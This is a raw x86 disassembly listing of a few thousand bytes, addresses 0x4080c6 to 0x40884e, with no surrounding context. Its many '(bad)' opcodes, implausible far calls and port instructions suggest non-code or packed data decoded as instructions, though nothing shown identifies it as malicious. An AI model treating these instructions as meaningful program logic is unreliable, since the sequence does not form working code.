  4080c6:	jne    0x408128
  4080c8:	rcl    BYTE PTR [ebx+0x0],0x0
  4080cc:	add    BYTE PTR [eax],al
  4080ce:	add    BYTE PTR [ebp+0x19],dl
  4080d1:	add    eax,DWORD PTR [eax]
  4080d3:	jne    0x4080be
  4080d5:	mov    eax,0x3f94952
  4080da:	add    BYTE PTR [ebp-0x10],dh
  4080dd:	add    edx,DWORD PTR [ecx+0x75]
  4080e0:	in     eax,dx
  4080e1:	add    eax,DWORD PTR [eax]
  4080e3:	jne    0x4080cc
  4080e5:	or     al,0x41
  4080e7:	jne    0x4080e7
  4080e9:	add    eax,DWORD PTR [eax]
  4080eb:	jne    0x4080ea
  4080ed:	enter  0xc74f,0xec
  4080f1:	retf   
  4080f2:	pop    eax
  4080f3:	retf   0xbee8
  4080f6:	push   ecx
  4080f7:	retf   
  4080f8:	(bad)  
  4080f9:	aad    0x5e
  4080fb:	lods   eax,DWORD PTR ds:[esi]
  4080fc:	add    al,0xd5
  4080fe:	push   ebx
  4080ff:	mov    dl,0x37
  408101:	add    eax,DWORD PTR [eax]
  408103:	jne    0x408117
  408105:	call   0x3aff:0xaff8d869
  40810c:	in     al,0xcf
  40810e:	push   ebx
  40810f:	lds    ecx,FWORD PTR [ebx+esi*8]
  408112:	sub    eax,0x31b64
  408117:	jne    0x408184
  408119:	mov    eax,0x31bc152
  40811e:	add    BYTE PTR [ebp+0x54],dh
  408121:	mov    esi,0xc30e7553
  408126:	inc    eax
  408127:	jne    0x4080af
  408129:	lds    eax,FWORD PTR [eax+0x75]
  40812c:	(bad)
  40812f:	jne    0x408133
  408131:	or     al,0xc6
  408133:	add    BYTE PTR [eax],al
  408135:	add    BYTE PTR [eax],al
  408137:	add    BYTE PTR ds:0x35c57d02,dh
  40813d:	add    bl,BYTE PTR [esi+0x320235b6]
  408143:	mov    eax,0xaf910235
  408148:	inc    esi
  408149:	mov    dl,0xc2
  40814b:	fcom   DWORD PTR [ebx-0x774f8253]
  408151:	mov    al,ds:0xd41b997f
  408156:	dec    ecx
  408157:	cdq    
  408158:	sbb    ebp,edx
  40815a:	call   0x4142f662
  40815f:	mov    al,0x26
  408161:	mov    dl,0x12
  408163:	fldenv [ebx-0x53]
  408166:	cmp    eax,0x4d9d58b1
  40816b:	cdq    
  40816c:	sbb    edx,DWORD PTR [esi-0x6ae825b5]
  408172:	cmp    ebx,ecx
  408174:	jb     0x40819b
  408176:	dec    ecx
  408177:	scas   al,BYTE PTR es:[edi]
  408178:	stos   BYTE PTR es:[edi],al
  408179:	add    dh,BYTE PTR [ecx-0x52]
  40817c:	mov    ds:0xb429dd02,al
  408181:	add    dh,bh
  408183:	aam    0xb5
  408185:	add    bl,bh
  408187:	aam    0xb5
  408189:	add    ah,dl
  40818b:	aam    0xb5
  40818d:	add    bh,BYTE PTR [ebp-0x28fd4bd7]
  408193:	aam    0xb5
  408195:	add    dl,BYTE PTR [ecx]
  408197:	into   
  408198:	mov    ch,0x2
  40819a:	push   edi
  40819b:	iret   
  40819c:	add    BYTE PTR [eax],al
  40819e:	add    BYTE PTR [eax],al
  4081a0:	add    BYTE PTR [edx+eax*1-0x2d596152],dh
  4081a7:	ficomp DWORD PTR [eax-0x60333c69]
  4081ad:	test   BYTE PTR [edi+0x2502b4b9],bl
  4081b3:	add    BYTE PTR [ebp-0x629c5e23],ah
  4081b9:	bt     DWORD PTR [ecx-0x78],esi
  4081bd:	and    BYTE PTR [edx+0x276e940],ch
  4081c3:	add    BYTE PTR [edi-0x7b8e3ff6],ah
  4081c9:	pop    ss
  4081ca:	mov    cl,0x64
  4081cc:	popf   
  4081cd:	out    dx,al
  4081ce:	mov    dl,0x64
  4081d0:	mov    dl,ah
  4081d2:	and    al,0xff
  4081d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081d5:	or     al,al
  4081d7:	jno    0x40815d
  4081d9:	xlat   BYTE PTR ds:[ebx]
  4081da:	mov    al,0x64
  4081dc:	cmp    al,0xe6
  4081de:	popf   
  4081df:	jno    0x40821a
  4081e1:	out    0x93,eax
  4081e3:	bound  ecx,QWORD PTR [esi+eiz*8-0x51]
  4081e7:	call   FWORD PTR [esi]
  4081e9:	vpcmpeqb xmm1,xmm5,XMMWORD PTR [edi+eax*8-0x57]
  4081ef:	dec    eax
  4081f0:	dec    edi
  4081f1:	jecxz  0x408186
  4081f3:	jno    0x408239
  4081f5:	shl    BYTE PTR [eax-0x4bf4c198],1
  4081fb:	jno    0x408213
  4081fd:	push   ss
  4081fe:	lahf   
  4081ff:	jb     0x40821b
  408201:	jns    0x408205
  408203:	add    BYTE PTR [ebx],bh
  408205:	add    BYTE PTR [eax],al
  408207:	add    BYTE PTR [eax],al
  408209:	add    BYTE PTR ds:0x141a5498,ah
  40820f:	mov    dl,0x53
  408211:	adc    DWORD PTR [edi],eax
  408213:	lahf   
  408214:	pusha  
  408215:	add    eax,0xfb60b026
  40821a:	or     ah,BYTE PTR [edi+edi*8]
  40821d:	sbb    eax,0xd64bb1d5
  408222:	rcr    DWORD PTR [edi+0x240acd43],1
  408228:	jmp    DWORD PTR [ebp-0x3bb94e06]
  40822e:	loop   0x4081ef
  408230:	imul   eax,DWORD PTR [eax],0x20
  408233:	push   0x8c386e60
  408238:	add    BYTE PTR fs:[edx-0x2],dh
  40823c:	arpl   WORD PTR [eax],ax
  40823e:	mov    ebp,0xdc0073ff
  408243:	(bad)  
  408244:	(bad)  
  408245:	dec    esp
  408247:	(bad)  
  408248:	(bad)  
  408249:	call   FWORD PTR [edi]
  40824b:	add    BYTE PTR [edi+0x0],cl
  40824e:	sbb    al,BYTE PTR [eax]
  408250:	push   esp
  408251:	add    bl,ch
  408253:	inc    DWORD PTR [eax+0x0]
  408256:	fdivp  st(7),st
  408258:	inc    esp
  408259:	add    al,ah
  40825b:	dec    DWORD PTR [eax+eax*1-0xb]
  40825f:	jmp    DWORD PTR [edx+0x0]
  408262:	dec    esi
  408263:	(bad)  
  408264:	outs   dx,BYTE PTR ds:[esi]
  408265:	add    BYTE PTR [edi],bh
  408267:	(bad)  
  408268:	outs   dx,BYTE PTR ds:[esi]
  408269:	add    BYTE PTR [edx],ch
  40826b:	(bad)  
  40826c:	jae    0x40826e
  40826e:	add    BYTE PTR [eax],al
  408270:	add    BYTE PTR [eax],al
  408272:	add    BYTE PTR [eax-0x2],ah
  408275:	push   esi
  408276:	add    BYTE PTR ds:0x38006dfe,ah
  40827c:	(bad)  
  40827d:	outs   dx,BYTE PTR ds:[esi]
  40827e:	add    BYTE PTR [ebx],bh
  408280:	(bad)  
  408281:	jb     0x408283
  408283:	jl     0x408283
  408285:	dec    ebp
  408286:	add    BYTE PTR [eax-0x70ffa402],ch
  40828c:	(bad)  
  40828d:	je     0x40828f
  40828f:	jle    0x40828f
  408291:	jno    0x408293
  408293:	jns    0x408293
  408295:	ins    DWORD PTR es:[edi],dx
  408296:	add    BYTE PTR [eax-0x1],cl
  408299:	push   ebp
  40829a:	add    BYTE PTR [ecx-0x2],bh
  40829d:	jno    0x40829f
  40829f:	aas    
  4082a0:	jmp    FWORD PTR [eax+0x0]
  4082a3:	xor    edi,edi
  4082a5:	ins    DWORD PTR es:[edi],dx
  4082a6:	add    BYTE PTR [eax],dh
  4082a8:	dec    DWORD PTR [edi+0x0]
  4082ab:	jmp    FWORD PTR ds:[esi+0x0]
  4082af:	jne    0x4082e4
  4082b1:	add    ebp,DWORD PTR [ecx+0x75]
  4082b4:	add    esp,DWORD PTR gs:[ebp+0x75]
  4082b8:	ins    DWORD PTR es:[edi],dx
  4082b9:	add    ebp,DWORD PTR [ecx+0x75]
  4082bc:	push   0x8d757403
  4082c1:	add    esp,DWORD PTR ds:0x36875
  4082c7:	jne    0x408332
  4082c9:	add    esi,DWORD PTR [edx+0x75]
  4082cc:	je     0x4082d1
  4082ce:	data16 jne 0x408253
  4082d1:	add    ebp,DWORD PTR [ebp+esi*2+0x7e]
  4082d5:	add    ecx,DWORD PTR [ecx+0x0]
  4082d8:	add    BYTE PTR [eax],al
  4082da:	add    BYTE PTR [eax],al
  4082dc:	jne    0x40826c
  4082de:	add    esp,DWORD PTR [ecx+0x75]
  4082e1:	jl     0x4082e6
  4082e3:	gs jne 0x40826f
  4082e6:	add    esp,DWORD PTR [ecx+0x75]
  4082e9:	lods   eax,DWORD PTR ds:[esi]
  4082ea:	add    ch,BYTE PTR [eax+0x75]
  4082ed:	sbb    DWORD PTR [ebx],eax
  4082ef:	add    BYTE PTR [ebp+0x19],dh
  4082f2:	scas   eax,DWORD PTR es:[edi]
  4082f3:	xor    eax,0x35af1a7c
  4082f8:	ins    BYTE PTR es:[edi],dx
  4082f9:	sub    BYTE PTR [ecx-0x30],al
  4082fc:	or     eax,0xfdd04145
  408301:	inc    esi
  408302:	loopne 0x40833d
  408304:	xlat   BYTE PTR ds:[ebx]
  408305:	or     dl,dl
  408307:	pop    esi
  408308:	ret    0x9edb
  40830b:	ins    DWORD PTR es:[edi],dx
  40830c:	shr    esp,0xd3
  40830f:	push   edx
  408310:	ror    BYTE PTR [ecx+ebx*4],cl
  408313:	fs loope 0x408341
  408316:	add    eax,DWORD PTR [eax]
  408318:	jne    0x4082f5
  40831a:	rcr    DWORD PTR [esi-0x4a],1
  40831d:	not    DWORD PTR [edx+esi*2+0x32bd8]
  408324:	jne    0x408321
  408326:	rcr    DWORD PTR [esi-0x3b],1
  408329:	and    BYTE PTR [edi-0x46fd8a95],dl
  40832f:	rol    ebx,1
  408331:	mov    ah,0xc3
  408333:	mov    ds:0xd1b90296,al
  408338:	mov    bl,0xb9
  40833a:	ficomp DWORD PTR [edx+0x3e8a786]
  408340:	add    BYTE PTR [eax],al
  408342:	add    BYTE PTR [eax],al
  408344:	add    BYTE PTR [ebp+0x2],dh
  408347:	push   esi
  408348:	gs mov ah,0x2
  40834b:	popa   
  40834c:	xchg   edi,eax
  40834d:	aaa    
  40834e:	add    ah,BYTE PTR [ecx-0x69]
  408351:	aaa    
  408352:	add    bl,ch
  408354:	inc    ebx
  408355:	xor    al,0x2
  408357:	fidivr DWORD PTR ds:0x3e260234
  40835d:	xor    al,0x2
  40835f:	call   0x343c:0x9602343c
  408366:	add    dh,BYTE PTR [ecx+0x3d]
  408369:	xor    al,0x2
  40836b:	jp     0x4083a9
  40836d:	xor    al,0x2
  40836f:	jle    0x4083ad
  408371:	xor    al,0x2
  408373:	fwait
  408374:	int    0x34
  408376:	add    dl,BYTE PTR [edx+0x4]
  408379:	adc    BYTE PTR [edx],al
  40837b:	pop    ebx
  40837c:	add    al,0x23
  40837e:	add    al,BYTE PTR [esp+eax*1+0x19]
  408382:	add    bh,dl
  408384:	add    eax,DWORD PTR [edi+0x2]
  408387:	(bad)  
  408389:	adc    DWORD PTR [edx],eax
  40838b:	inc    ebp
  40838c:	add    al,0xe1
  40838e:	add    ch,cl
  408390:	add    esi,DWORD PTR [ebp+0x2]
  408393:	cs lahf 
  408395:	out    0xb2,al
  408397:	sbb    dl,BYTE PTR [ebp-0x4ff6682a]
  40839d:	mov    ebp,0x4a9506b0
  4083a2:	and    esp,edx
  4083a4:	add    edx,eax
  4083a6:	add    ch,cl
  4083a8:	add    eax,DWORD PTR [eax]
  4083aa:	add    BYTE PTR [eax],al
  4083ac:	add    BYTE PTR [eax],al
  4083ae:	jne    0x4083b2
  4083b0:	add    cl,cl
  4083b2:	jbe    0x4083a3
  4083b4:	inc    DWORD PTR [esi]
  4083b6:	jno    0x4083ba
  4083b8:	add    BYTE PTR [ecx+edi*2],dl
  4083bb:	scas   eax,DWORD PTR es:[edi]
  4083bc:	inc    DWORD PTR [ebx]
  4083be:	jno    0x408352
  4083c0:	dec    DWORD PTR [ebx]
  4083c2:	jns    0x408359
  4083c4:	(bad)  
  4083c5:	call   0xbd408640
  4083ca:	jbe    0x40837b
  4083cc:	(bad)  
  4083cd:	mov    eax,0xa0000276
  4083d2:	and    eax,0xd8b66eb8
  4083d7:	aam    0x4f
  4083d9:	fwait
  4083da:	or     DWORD PTR [esp+eiz*2-0xdeda66],esp
  4083e1:	retf   
  4083e2:	jbe    0x4083cb
  4083e4:	call   FWORD PTR [ecx-0x17001b8a]
  4083ea:	jbe    0x4083ee
  4083ec:	add    bl,cl
  4083ee:	jbe    0x4083d7
  4083f0:	(bad)  
  4083f1:	jns    0x408469
  4083f3:	in     al,0xff
  4083f5:	enter  0xe776,0xff
  4083f9:	pop    ecx
  4083fa:	jns    0x4083fe
  4083fc:	add    BYTE PTR [edx+eax*1-0x5a],dl
  408400:	jno    0x40844e
  408402:	(bad)  
  408403:	xchg   esi,eax
  408404:	sub    eax,0xffacc545
  408409:	sub    ebx,ebp
  40840b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40840c:	pusha  
  40840d:	xor    eax,0x3f6dc5cc
  408412:	add    BYTE PTR [eax],al
  408414:	add    BYTE PTR [eax],al
  408416:	add    BYTE PTR [eax],ah
  408418:	xchg   edx,eax
  408419:	outs   dx,BYTE PTR ds:[esi]
  40841a:	aas    
  40841b:	and    al,0xa7
  40841d:	ins    DWORD PTR es:[edi],dx
  40841e:	sbb    eax,0xa6eac3b
  408423:	or     ah,BYTE PTR [eax]
  408425:	jmp    FWORD PTR ds:0x1b73951c
  40842b:	push   es
  40842c:	fwait
  40842d:	inc    esp
  40842e:	add    BYTE PTR [edx+0x7c],ch
  408431:	push   0x6c546b72
  408436:	gs jp  0x4084b3
  408439:	inc    ecx
  40843a:	ins    BYTE PTR es:[edi],dx
  40843b:	sub    ebp,DWORD PTR [ecx+0x6a]
  40843e:	add    BYTE PTR [esi+0x6a],dl
  408441:	or     al,0xa
  408443:	xor    BYTE PTR [ebx+0x6b],ch
  408446:	and    BYTE PTR [esi+0x29],bh
  408449:	jb     0x40846d
  40844b:	sub    DWORD PTR [esi],ecx
  40844d:	imul   esp,DWORD PTR [esi+0x6c],0xbf697769
  408454:	ja     0x408475
  408456:	and    al,BYTE PTR [ecx-0x4cdfde89]
  40845c:	push   esp
  40845d:	jae    0x4084ce
  40845f:	lods   al,BYTE PTR ds:[esi]
  408460:	addr16 (bad) 
  408462:	(bad)  
  408463:	out    dx,al
  408464:	add    esp,DWORD PTR [ecx+0x0]
  408467:	lock add eax,DWORD PTR [eax]
  40846a:	add    BYTE PTR [ebx+ebp*2],bl
  40846d:	bound  ebp,QWORD PTR [eax-0x15]
  408470:	and    ebp,DWORD PTR [esi+0x66]
  408473:	repnz repnz or DWORD PTR ds:0x6409f22f,esp
  40847b:	add    BYTE PTR [eax],al
  40847d:	add    BYTE PTR [eax],al
  40847f:	add    cl,dh
  408481:	outs   dx,DWORD PTR ds:[esi]
  408482:	pop    ds
  408483:	das    
  408484:	push   edx
  408485:	and    DWORD PTR es:0xa0c283f,esp
  40848c:	pushf  
  40848d:	add    eax,DWORD PTR [eax]
  40848f:	add    BYTE PTR [ebx+0x6c006303],cl
  408495:	push   es
  408496:	and    al,BYTE PTR [eax]
  408498:	jno    0x4084a0
  40849a:	jae    0x40849c
  40849c:	jle    0x4084a4
  40849e:	add    BYTE PTR [eax],al
  4084a0:	lahf   
  4084a1:	push   es
  4084a2:	outs   dx,DWORD PTR ds:[esi]
  4084a3:	add    BYTE PTR [ecx+0x7c005306],cl
  4084a9:	push   es
  4084aa:	add    BYTE PTR gs:[ebp+0xc],dh
  4084ae:	add    al,0x0
  4084b0:	jne    0x408470
  4084b2:	cmp    al,0x41
  4084b4:	jne    0x408504
  4084b6:	add    esi,DWORD PTR [ebx+0x75]
  4084b9:	inc    esi
  4084ba:	add    esi,DWORD PTR [eax]
  4084bc:	jne    0x40850f
  4084be:	add    edi,DWORD PTR [eax+0x75]
  4084c1:	pop    edi
  4084c2:	add    esp,DWORD PTR ds:0x33c75
  4084c8:	jne    0x4084d0
  4084ca:	add    al,0x73
  4084cc:	jne    0x4084dc
  4084ce:	add    al,0x30
  4084d0:	jne    0x4084c3
  4084d2:	add    edi,DWORD PTR [eax+0x75]
  4084d5:	sub    DWORD PTR [ebx],eax
  4084d7:	add    BYTE PTR [ebp-0xd],dh
  4084da:	add    eax,DWORD PTR [eax]
  4084dc:	jne    0x4084a0
  4084de:	xor    DWORD PTR [ecx+0x75],eax
  4084e1:	fnsave [ecx]
  4084e3:	inc    ecx
  4084e4:	add    BYTE PTR [eax],al
  4084e6:	add    BYTE PTR [eax],al
  4084e8:	add    BYTE PTR [ebp-0xb],dh
  4084eb:	xor    DWORD PTR [ecx+0x75],eax
  4084ee:	or     eax,0x2754132
  4084f3:	xor    al,BYTE PTR [ecx+0x75]
  4084f6:	sbb    eax,0xf2754131
  4084fb:	xor    DWORD PTR [ecx+0x75],eax
  4084fe:	out    dx,al
  4084ff:	xor    DWORD PTR [ecx+0x75],eax
  408502:	jl     0x408507
  408504:	cmp    dh,BYTE PTR [ebp+0x41]
  408507:	add    ecx,DWORD PTR [ebp+0x75]
  40850a:	aad    0x3
  40850c:	cmp    esi,DWORD PTR [ebp-0x1c]
  40850f:	add    ecx,DWORD PTR [esi+0x75]
  408512:	fild   DWORD PTR [ebx]
  408514:	dec    esi
  408515:	jne    0x4084ef
  408517:	add    ecx,DWORD PTR [esi+0x75]
  40851a:	loope  0x40851f
  40851c:	cmp    esi,DWORD PTR [ebp+0x4]
  40851f:	add    al,0x3b
  408521:	jne    0x40850a
  408523:	add    edx,DWORD PTR [edi+0x75]
  408526:	add    al,BYTE PTR [eax+eax*1]
  408529:	jne    0x40852d
  40852b:	mov    BYTE PTR [eax],cl
  40852d:	scas   al,BYTE PTR es:[edi]
  40852e:	(bad)  
  40852f:	fdiv   st,st(4)
  408531:	inc    edx
  408532:	hlt    
  408533:	addr16 pop esp
  408535:	jne    0x408579
  408537:	push   ds
  408538:	cmp    al,0x9f
  40853a:	push   esi
  40853b:	push   0x651fb0b8
  408540:	cmc    
  408541:	inc    edx
  408542:	hlt    
  408543:	inc    ecx
  408544:	pop    edi
  408545:	jne    0x408529
  408547:	cmp    eax,0x44094441
  40854c:	loopne 0x40854e
  40854e:	add    BYTE PTR [eax],al
  408550:	add    BYTE PTR [eax],al
  408552:	icebp  
  408553:	pop    ds
  408554:	addr16 mov eax,ds:0xf442
  408558:	push   0xffffffb6
  40855a:	or     bl,BYTE PTR [esi-0x62]
  40855d:	cmp    ebx,DWORD PTR [edi-0x627b67aa]
  408563:	inc    edi
  408564:	addr16 mov eax,ds:0xf3c2
  408568:	push   0xffffffb6
  40856a:	jmp    0x3c56:0x3f3b9e5d
  408571:	loopne 0x408564
  408573:	pop    ds
  408574:	addr16 mov eax,ds:0xf3c2
  408578:	push   0xffffffb6
  40857a:	retf   0x9e5d
  40857d:	cmp    ebx,DWORD PTR [edi]
  40857f:	push   esi
  408580:	push   eax
  408581:	jbe    0x4085ec
  408583:	and    eax,0xf3c5ccfc
  408588:	bound  esi,QWORD PTR [edi+0x75]
  40858b:	inc    edx
  40858c:	sahf   
  40858d:	pop    edx
  40858e:	inc    esp
  40858f:	adc    DWORD PTR [ebx-0x23da968b],edx
  408595:	int3   
  408596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408597:	repz bound esi,QWORD PTR [esi+0x75]
  40859b:	inc    edx
  40859c:	push   ds
  40859d:	pop    ebx
  40859e:	and    al,0x11
  4085a0:	repz add esi,DWORD PTR [ebp+0x2]
  4085a4:	cmc    
  4085a5:	and    DWORD PTR [edx+eax*1-0x3dde2100],esi
  4085ac:	push   DWORD PTR [ebp-0x61003c80]
  4085b2:	and    al,bl
  4085b4:	call   edx
  4085b6:	add    BYTE PTR [eax],al
  4085b8:	add    BYTE PTR [eax],al
  4085ba:	add    BYTE PTR [ebp-0x15],al
  4085bd:	jmp    DWORD PTR [edi]
  4085bf:	adc    BYTE PTR [eax-0x1222e69c],ah
  4085c5:	dec    ebx
  4085c6:	or     BYTE PTR [edi],al
  4085c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085c9:	je     0x4085d3
  4085cb:	fsub   QWORD PTR [ebp+0x276c939]
  4085d1:	add    BYTE PTR [edx],ch
  4085d3:	in     al,0xae
  4085d5:	ins    DWORD PTR es:[edi],dx
  4085d6:	int3   
  4085d7:	rcl    DWORD PTR [eax-0x253b3198],1
  4085dd:	pop    ds
  4085de:	stos   BYTE PTR es:[edi],al
  4085df:	fisubr DWORD PTR [ebx+0x873c472]
  4085e5:	add    BYTE PTR [eax+eiz*8+0x24ce6ca8],bh
  4085ec:	out    dx,eax
  4085ed:	arpl   bp,ax
  4085ef:	sbb    bl,BYTE PTR ds:0x91189eff
  4085f5:	pusha  
  4085f6:	nop
  4085f7:	and    al,0xb6
  4085f9:	jb     0x40857f
  4085fb:	call   0x4ccecc1
  408600:	xchg   ecx,eax
  408601:	push   edx
  408602:	xchg   ebp,eax
  408603:	call   0x76cef3b1
  408608:	add    al,BYTE PTR [eax]
  40860a:	cdq    
  40860b:	jbe    0x40859d
  40860d:	inc    DWORD PTR [ebp+0x7fffaa76]
  408613:	jbe    0x4085b5
  408615:	dec    DWORD PTR [edi+0x71]
  408618:	xchg   esi,eax
  408619:	jmp    DWORD PTR [ecx+edi*2]
  40861c:	mov    dh,0xff
  40861e:	sub    al,0x0
  408620:	add    BYTE PTR [eax],al
  408622:	add    BYTE PTR [eax],al
  408624:	jno    0x408628
  408626:	add    BYTE PTR ds:0xff1cd0,bh
  40862c:	and    al,0x34
  40862e:	(bad)  
  40862f:	inc    esp
  408631:	cmp    edi,edi
  408633:	push   DWORD PTR [edx+edi*1+0x2fb4ffff]
  40863a:	(bad)  
  40863b:	inc    DWORD PTR [eax+esi*1+0x3564ffff]
  408642:	(bad)  
  408643:	(bad)  
  408644:	js     0x4086b3
  408646:	jne    0x408648
  408648:	push   0x38ffff6a
  40864d:	jb     0x40864e
  40864f:	inc    DWORD PTR [eax+esi*2+0x707effff]
  408656:	(bad)  
  408657:	dec    DWORD PTR [esi]
  408659:	add    al,BYTE PTR [edx]
  40865b:	add    cl,BYTE PTR [edi]
  40865d:	add    al,BYTE PTR [edx]
  40865f:	add    bl,BYTE PTR [esi]
  408661:	add    al,BYTE PTR [edx]
  408663:	add    dl,BYTE PTR [esi]
  408665:	or     cl,BYTE PTR [edx]
  408667:	and    BYTE PTR [esi],dl
  408669:	or     cl,BYTE PTR [edx]
  40866b:	or     al,BYTE PTR [esi]
  40866d:	or     cl,BYTE PTR [edx]
  40866f:	or     ch,BYTE PTR [edi]
  408671:	popa   
  408672:	jno    0x4086dd
  408674:	sub    al,0x74
  408676:	(bad)  
  408677:	jmp    DWORD PTR [edx]
  408679:	bound  esi,QWORD PTR [edx+0x70]
  40867c:	xlat   BYTE PTR ds:[ebx]
  40867d:	(bad)  
  40867e:	(bad)  
  40867f:	call   FWORD PTR [esi]
  408681:	addr16 jb 0x4086ed
  408684:	call   FWORD PTR [edi]
  408686:	(bad)  
  408687:	inc    DWORD PTR [eax]
  408689:	add    BYTE PTR [eax],al
  40868b:	add    BYTE PTR [eax],al
  40868d:	fcom   QWORD PTR [ebx]
  40868f:	inc    ecx
  408690:	add    bh,bl
  408692:	jmp    DWORD PTR [eax+eax*1+0xf]
  408696:	add    BYTE PTR [eax+0x0],ch
  408699:	sub    edi,edi
  40869b:	jae    0x40869d
  40869d:	clc    
  40869e:	jmp    FWORD PTR [esi+0x0]
  4086a1:	cmp    eax,DWORD PTR [esi]
  4086a3:	outs   dx,BYTE PTR ds:[esi]
  4086a4:	add    BYTE PTR [esi+eax*1+0x72],cl
  4086a8:	add    BYTE PTR [ebp-0x3e],dh
  4086ab:	add    esi,DWORD PTR [esi+0x75]
  4086ae:	ret    0x6c03
  4086b1:	jne    0x408681
  4086b3:	add    esp,DWORD PTR [edi+0x75]
  4086b6:	mov    BYTE PTR [ebx],0x0
  4086b9:	jne    0x4086e1
  4086bb:	add    eax,DWORD PTR [eax]
  4086bd:	jne    0x408665
  4086bf:	loopne 0x408702
  4086c1:	jne    0x40866c
  4086c3:	loopne 0x408706
  4086c5:	jne    0x4086a7
  4086c7:	call   0xe1c2fc0d
  4086cc:	inc    ecx
  4086cd:	jne    0x4086e5
  4086cf:	out    0x41,eax
  4086d1:	jne    0x408748
  4086d3:	cs inc ecx
  4086d5:	jne    0x4086ca
  4086d7:	out    0x41,eax
  4086d9:	jne    0x4086b1
  4086db:	out    0x41,al
  4086dd:	jne    0x40872c
  4086df:	out    0x41,eax
  4086e1:	jne    0x408698
  4086e3:	sub    eax,0x2db27541
  4086e8:	inc    ecx
  4086e9:	jne    0x40872e
  4086eb:	in     eax,0x41
  4086ed:	jne    0x408733
  4086ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086f0:	push   0x0
  4086f5:	add    BYTE PTR [ebp-0x5c8d67cb],al
  4086fb:	inc    ebp
  4086fc:	scas   eax,DWORD PTR es:[edi]
  4086fd:	imul   esi,DWORD PTR [ebp+0x6c],0xffffffa7
  408701:	push   0x72985d65
  408706:	inc    esi
  408707:	jge    0x4086ad
  408709:	jno    0x408754
  40870b:	jbe    0x4086a0
  40870d:	dec    edx
  40870f:	imul   esp,DWORD PTR [edi-0x6862ba98],0x72
  408716:	es jno 0x4086b1
  408719:	jae    0x408734
  40871b:	mov    WORD PTR [esi-0x58938a93],ss
  408721:	push   0x64916825
  408726:	adc    al,0x2
  408728:	pop    ebp
  408729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40872a:	xor    al,0xa9
  40872c:	push   esp
  40872d:	scas   eax,DWORD PTR es:[edi]
  40872e:	adc    eax,0x13922e92
  408733:	lods   eax,DWORD PTR ds:[esi]
  408734:	and    dl,al
  408736:	sub    eax,0xc2c333b6
  40873b:	add    ah,BYTE PTR [esi]
  40873d:	test   al,0xdd
  40873f:	xchg   edx,eax
  408740:	sub    al,0xab
  408742:	out    0x92,eax
  408744:	cmp    eax,0x13cbd191
  408749:	mov    ds:0x3e89fdb,eax
  40874e:	jne    0x408752
  408750:	cs test al,0xcd
  408753:	xchg   edx,eax
  408754:	and    eax,0x13cbc6a7
  408759:	mov    ds:0x0,eax
  40875e:	add    BYTE PTR [ebx-0x6851dc61],bl
  408764:	test   eax,0x95a4a70c
  408769:	sbb    DWORD PTR [ebx+0x3e89f9c],ebp
  40876f:	jne    0x408773
  408771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408773:	popf   
  408774:	xchg   edx,eax
  408775:	lods   eax,DWORD PTR ds:[esi]
  408776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408777:	xchg   bl,cl
  408779:	mov    ebx,0xab9f93a2
  40877e:	lods   eax,DWORD PTR ds:[esi]
  40877f:	push   edi
  408780:	test   eax,0x9564a6c4
  408785:	call   0xa642fc8d
  40878a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40878b:	dec    ebp
  40878c:	xchg   edx,eax
  40878d:	mov    ecx,0xaf9f48a2
  408792:	scas   al,BYTE PTR es:[edi]
  408793:	push   ebp
  408794:	mov    eax,ds:0xb553b78b
  408799:	xchg   esp,eax
  40879a:	xchg   ecx,eax
  40879b:	push   ecx
  40879c:	mov    ds:0x2750393,eax
  4087a1:	xor    al,0x28
  4087a3:	dec    esi
  4087a4:	idiv   edi
  4087a6:	mov    ds:0x4d44e77c,al
  4087ab:	pop    edx
  4087ac:	mov    bh,0xb2
  4087ae:	cmp    BYTE PTR [edx+0x21],bh
  4087b1:	jmp    0x4087bf
  4087b3:	jno    0x408745
  4087b5:	(bad)  
  4087b6:	call   0x3b408a31
  4087bb:	mov    bl,0xc3
  4087bd:	pop    ds
  4087be:	stc    
  4087bf:	inc    esi
  4087c0:	aam    0x2d
  4087c2:	stc    
  4087c3:	add    BYTE PTR [eax],al
  4087c5:	add    BYTE PTR [eax],al
  4087c7:	add    BYTE PTR [esi-0x2c],al
  4087ca:	or     ecx,ebp
  4087cc:	jbe    0x4087d0
  4087ce:	add    BYTE PTR [ebx],bl
  4087d0:	xor    eax,ebx
  4087d2:	pop    ds
  4087d3:	jmp    0x9d408a4e
  4087d8:	add    al,bl
  4087da:	jmp    DWORD PTR [ecx+0xb]
  4087dd:	ret    
  4087de:	push   DWORD PTR [edi+0x3]
  4087e1:	ret    
  4087e2:	call   FWORD PTR [eax]
  4087e4:	jmp    0x4087a8
  4087e6:	dec    DWORD PTR ds:0x6bffc3b0
  4087ec:	call   0xe0b887b3
  4087f1:	ret    0x1cff
  4087f4:	jae    0x4087b9
  4087f6:	push   DWORD PTR [ecx+0x3effc2c2]
  4087fc:	retf   0xffc2
  4087ff:	push   esi
  408800:	ret    0xffc2
  408803:	lods   eax,DWORD PTR ds:[esi]
  408804:	jbe    0x4087ac
  408806:	dec    ebp
  408808:	jbe    0x4087ae
  40880a:	inc    edi
  40880c:	jbe    0x4087b4
  40880e:	dec    DWORD PTR [esi+esi*2+0x76b50002]
  408815:	test   eax,0xa37689ff
  40881a:	inc    DWORD PTR [esi+esi*2+0x76e8ffb6]
  408821:	add    al,BYTE PTR [eax]
  408823:	add    cl,al
  408825:	pop    ebx
  408826:	inc    ecx
  408827:	add    bl,cl
  408829:	add    al,0x0
  40882b:	add    BYTE PTR [eax],al
  40882d:	add    BYTE PTR [eax],al
  40882f:	add    BYTE PTR [eax],al
  408831:	out    dx,al
  408832:	add    al,0x63
  408834:	add    BYTE PTR [esp+eax*1+0x613e0000],cl
  40883b:	arpl   WORD PTR [esi+0x33],sp
  40883e:	imul   bp,WORD PTR [ebx+0x38],0x6d6b
  408844:	jo     0x408863
  408846:	jo     0x4088ba
  408848:	je     0x4087fc
  40884a:	jae    0x4088c3
  40884c:	jp     0x40880b
  40884e:	popa   
